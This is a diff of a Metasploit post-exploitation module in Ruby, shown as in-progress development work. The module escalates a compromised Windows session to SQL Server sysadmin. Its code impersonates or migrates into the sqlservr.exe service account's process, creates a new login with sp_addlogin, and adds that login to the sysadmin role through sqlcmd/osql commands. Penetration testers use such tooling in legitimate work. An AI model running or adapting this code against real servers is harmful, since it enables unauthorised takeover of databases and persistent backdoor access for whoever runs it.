@@ -39,8 +39,8 @@ class Metasploit3 < Msf::Post
 	end
 	
 	# TODO
-	# - rewrite impersonation module to target non system sqlservr.exe services
-	# - fix osql/sqlcmd syntax for sql server 2012
+	# - fix - migrate wont rev2self...need to return back to system privs	
+	# - fix - when not using incognito set token = false	
 	# - update verbose stuff	
 	# - test all fucntions on all version
 	# - run through ruby module validation process
@@ -84,7 +84,7 @@ class Metasploit3 < Msf::Post
 							
 								# Attempt to impersonate sql server service account (for sql server 2012)							
 								impersonate_status = impersonate_sql_user(service_instance,verbose)
-								if impersonate_status == 1
+								if impersonate_status == 1								
 									
 									# Add new login						
 									add_login_status = add_sql_login(sql_client,datastore['DB_USERNAME'],datastore['DB_PASSWORD'],instance,service_instance,verbose)
@@ -218,14 +218,18 @@ class Metasploit3 < Msf::Post
 		# Setup command format to accomidate version inconsistencies
 		if instance == ""			
 			# Check default instance name
-			if service_instance == "SQLEXPRESS" then			
-				sqlcommand = "#{sqlclient} -E -S .\\SQLEXPRESS -Q \"sp_addlogin '#{dbuser}','#{dbpass}'\""						
+			if service_instance == "MSSQLSERVER" then
+				print_status(" o MSSQL Service instance: #{service_instance}") if verbose == "true" 
+				sqlcommand = "#{sqlclient} -E -S #{sysinfo['Computer']} -Q \"sp_addlogin '#{dbuser}','#{dbpass}'\""	
 			else
-				sqlcommand = "#{sqlclient} -E -S #{sysinfo['Computer']} -Q \"sp_addlogin '#{dbuser}','#{dbpass}'\""					
+				# User defined instance
+			print_status(" o  OTHER Service instance: #{service_instance}") if verbose == "true" 
+			sqlcommand = "#{sqlclient} -E -S #{sysinfo['Computer']}\\#{service_instance} -Q \"sp_addlogin '#{dbuser}','#{dbpass}'\""	
 			end
 		else
 			# User defined instance
-			sqlcommand = "#{sqlclient} -E -S .\\#{instance} -Q \"sp_addlogin '#{dbuser}','#{dbpass}'\""							
+			print_status(" o defined instance: #{service_instance}") if verbose == "true" 
+			sqlcommand = "#{sqlclient} -E -S #{sysinfo['Computer']}\\#{instance} -Q \"sp_addlogin '#{dbuser}','#{dbpass}'\""		
 		end
 
 		# Display debugging information
@@ -275,15 +279,13 @@ class Metasploit3 < Msf::Post
 		# Setup command format to accomidate command inconsistencies
 		if instance == ""			
 			# Check default instance name
-			if service_instance == "SQLEXPRESS" then			
-				# Set command here for SQLEXPRESS							
-				sqlcommand = "#{sqlclient} -E -S .\\SQLEXPRESS -Q \"sp_addsrvrolemember '#{dbuser}','sysadmin';if (select is_srvrolemember('sysadmin'))=1 begin select 'bingo' end \""				
-			else 											
+			if service_instance == "MSSQLSERVER" then												
 				sqlcommand = "#{sqlclient} -E -S #{sysinfo['Computer']} -Q \"sp_addsrvrolemember '#{dbuser}','sysadmin';if (select is_srvrolemember('sysadmin'))=1 begin select 'bingo' end \""				
+			else 											
+				sqlcommand = "#{sqlclient} -E -S #{sysinfo['Computer']}\\#{service_instance} -Q \"sp_addsrvrolemember '#{dbuser}','sysadmin';if (select is_srvrolemember('sysadmin'))=1 begin select 'bingo' end \""				
 			end
-		else		
-			# Set command here			
-			sqlcommand = "#{sqlclient} -E -S .\\#{instance} -Q \"sp_addsrvrolemember '#{dbuser}','sysadmin';if (select is_srvrolemember('sysadmin'))=1 begin select 'bingo' end \""	
+		else								
+			sqlcommand = "#{sqlclient} -E -S #{sysinfo['Computer']}\\#{instance} -Q \"sp_addsrvrolemember '#{dbuser}','sysadmin';if (select is_srvrolemember('sysadmin'))=1 begin select 'bingo' end \""	
 		end
 	
 		# Display debugging information
@@ -383,9 +385,10 @@ class Metasploit3 < Msf::Post
 	## Method for executing cmd and returning the response
 	## 
 	## Note: This is from one of Jabra's modules - Thanks man!
+	## #craps out when escalating from local admin to system
 	##----------------------------------------------
 	def run_cmd(cmd,token=true)
-		opts = {'Hidden' => true, 'Channelized' => true} #, 'UseThreadToken' => token
+		opts = {'Hidden' => true, 'Channelized' => true, 'UseThreadToken' => token} 
 		process = session.sys.process.execute(cmd, nil, opts)
 		res = ""
 		while (d = process.channel.read)
@@ -447,18 +450,32 @@ class Metasploit3 < Msf::Post
 	## ----------------------------------------------
 	def impersonate_sql_user(service_instance,verbose)
 	
+		blah = session.sys.config.getuid # remove later
+		print_status("I AM #{blah}") # remove later
+	
 		print_status("Searching for sqlservr.exe processes not running as SYSTEM...")	
 
 		#define targetuser
 		targetuser = ""
+		targetpid = ""
 			
 		## Identify user running the SQL Server service process
 		session.sys.process.get_processes().each do |x|
 		
 			# Search for all sqlservr.exe processes
-			if ( x['name'] == "sqlservr.exe" and x['user'] != "NT AUTHORITY\\SYSTEM")
-				print_good("Found \"#{x['user']}\" running sqlservr.exe process")
-				targetuser = x['user']
+			if ( x['name'] == "sqlservr.exe" and x['user'] != "NT AUTHORITY\\SYSTEM")				
+				
+				# Look for target instance
+				if x['user'] =~ /NT SERVICE/ then
+					if x['user'] == "NT SERVICE\\MSSQL$#{service_instance}" then
+						print_good("Found \"#{x['user']}\" running sqlservr.exe process") 
+						targetuser = "NT SERVICE\\MSSQL$#{service_instance}"
+						targetpid = x['pid'] 					
+					end
+				else 
+					targetuser = x['user']
+					targetpid = x['pid']
+				end
 			end
 		end
 	
@@ -476,7 +493,7 @@ class Metasploit3 < Msf::Post
 			print_error("Failed to load incognito on #{session.sid} / #{session.session_host}")
 			return 0
 		else
-			print_good("Sucessfully loaded incognito")
+			print_good("Sucessfully loaded incognito on #{session.sid} / #{session.session_host}")
 		
 			# Parse delegation tokens
 			print_status("Searching for deligation \"#{targetuser}\" token...")
@@ -484,21 +501,32 @@ class Metasploit3 < Msf::Post
 			if res
 				res["delegation"].split("\n").each do |user|
 									
-					if targetuser == user
-						sid = session.sid
-						peer = session.session_host
-						print_good("Found deligation token: #{user}")
-						
-						# Impersonate SQL Server user
-						print_status("Attempting to impersonate \"#{targetuser}\"...")
-						if (targetuser != '')			
-							res = session.incognito.incognito_impersonate_token(targetuser)
-							print_good("Successfully impersonated \"#{targetuser}\"")
-							return 1
-						else
-							print_error("Unabled to impersonate \"#{targetuser}\"")
-							return 0
-						end							
+					if targetuser == user						
+						print_good("Found deligation token: #{user}")						
+						print_status("Attempting to impersonate \"#{targetuser}\"...")						
+																				
+							#print_status("Stealing token of process ID #{targetpid}")							
+							#session.sys.config.steal_token(targetpid) # after this is set i cant getuid
+							
+							#print_status("Attempting to impersonate #{targetuser}")
+							#session.incognito.incognito_impersonate_token(domain_user)
+							#current_user = session.sys.config.getuid
+									
+							# Migrating works, but I cant do a rev 2 self
+							session.core.migrate(targetpid.to_i)
+							
+							blah = session.sys.config.getuid # remove later
+							print_status("I AM #{blah}") # remove later	
+							
+							#if current_user != targetuser
+								# print_error "Steal Token Failed)"
+							#	return 0
+							#else 
+								print_good("Successfully impersonated \"#{targetuser}\"")	
+								return 1
+							#end
+					else
+						print_error("Token not found")
 					end				
 				end
 			end
@@ -506,7 +534,7 @@ class Metasploit3 < Msf::Post
 			print_error("Deligation token not found for: #{targetuser}")
 			print_error("Failure complete.")
 			return 0
-		end		
+		end				
 	end	
 	
 	##
